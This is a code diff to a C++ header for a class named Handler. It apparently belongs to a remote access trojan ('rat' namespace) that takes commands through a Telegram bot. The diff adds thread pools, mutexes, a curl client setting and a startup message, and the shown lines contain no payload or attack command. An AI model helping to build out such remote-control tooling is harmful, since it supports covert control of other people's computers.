@@ -1,6 +1,7 @@
 /*include/rat/Handler.hpp*/
 #pragma once
 #include "rat/handler/types.hpp"
+#include "rat/ThreadPool.hpp"
 #include "rat/tbot/tbot.hpp"
 #include "rat/tbot/types.hpp"
 #include "rat/networking.hpp"
@@ -9,7 +10,7 @@
 #include <array>
 #include <vector>
 #include <cstdint>
-
+#include <mutex>
 
 namespace rat::handler {
 
@@ -17,13 +18,22 @@ class Handler {
 private:
 
     //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
-    tbot::Bot& bot;
-    tbot::BaseBot& backing_bot;
-    
-    RatState state;
-    rat::networking::Client curl_client;
+    ::rat::tbot::Bot& bot;
+    ::rat::tbot::BaseBot& backing_bot;
+    ::rat::networking::Client curl_client;
 
-    rat::tbot::Update telegram_update;
+
+    ::rat::ThreadPool networking_pool;
+    ::rat::ThreadPool process_pool;
+    ::rat::ThreadPool timer_pool;
+
+    std::mutex curl_client_mutex; 
+    std::mutex backing_bot_mutex;
+
+    ::rat::handler::RatState state;
+    /*since now we have a backing bot we can use its curl_client*/ 
+
+    ::rat::tbot::Update telegram_update;
     Command command;
 
     struct CommandHandler {
@@ -88,11 +98,16 @@ public:
     Handler(rat::tbot::Bot& arg_Bot, rat::tbot::BaseBot& Backing_Bot):
         bot(arg_Bot),
         backing_bot(Backing_Bot),
+        curl_client(3),
+        networking_pool(1),
+        process_pool(1),
+        timer_pool(1),
         state(),
-        curl_client(),
         telegram_update(),
         command()
-        {} 
+        {
+            this->bot.sendMessage("Handler has been istantiated");
+        } 
     // Handle Telegram update
     void handleUpdate(rat::tbot::Update&& arg_Update);
      
